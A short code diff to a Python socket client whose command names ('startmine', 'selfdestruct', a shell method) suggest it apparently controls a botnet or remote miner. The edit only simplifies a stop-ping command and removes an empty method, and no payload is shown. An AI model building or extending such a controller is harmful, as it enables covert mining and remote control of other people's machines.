@@ -49,11 +49,8 @@ class Client:
         self.server.recv(1024)
 
     def stop_ping(self):
-        command = 'stop ping'
-        self.server.send(command.encode('utf-8'))
-        time.sleep(0.5)
-        self.server.recv(1024)
-        
+        self.server.send('noping'.encode('utf-8'))
+
     def start_mine(self):
         command = 'startmine'
         self.server.send(command.encode('utf-8'))
@@ -91,8 +88,6 @@ class Client:
         recieved = self.server.recv(1024).decode('utf-8')
         return recieved
 
-    def stop_shell(self):
-        pass
         
     def destroy(self):
         command = 'selfdestruct'
